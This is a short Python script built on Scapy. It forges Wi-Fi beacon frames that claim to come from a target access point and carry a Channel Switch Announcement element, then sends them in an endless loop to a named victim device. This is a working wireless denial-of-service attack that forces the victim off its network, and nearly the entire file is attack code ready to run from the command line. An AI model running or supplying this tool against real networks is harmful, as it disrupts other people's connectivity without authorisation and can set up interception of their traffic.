from scapy.all import *
import time
import sys

def csa_attack(iface, ssid, ap_mac, victim):#, count):
    print('[*] CSA Attack!')
    dot11 = Dot11(type=0, subtype=8, addr1=victim, addr2=ap_mac, addr3=ap_mac)
    beacon = Dot11Beacon(cap=0x401, timestamp=int(time.time()))
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    dsparam = Dot11Elt(ID=0x3,len=1,info=b'\x28')

    csa = Dot11Elt(ID=0x25,len=3,info=b'\x00\xff\x01')

    #frame = RadioTap()/dot11/beacon/essid/dsparam/csa
    frame = RadioTap()/dot11/beacon/essid/csa
    print('[*] Start...!!')
    sendp(frame, iface=iface, inter=0.0, loop=1)
    # send -> No Working
    #send(frame, iface=iface,count=int(count),inter=0.0,loop=1)

if __name__ == '__main__':
    args = sys.argv
    if len(args)<5:
        print('python3 {0} <iface> <target ssid> <target AP MAC> <Victim>'.format(args[0]))
        exit()

    iface = args[1]
    ssid = args[2]
    ap_mac = args[3]
    victim = args[4]
    #count = args[5]
    csa_attack(iface, ssid, ap_mac, victim)#, count)


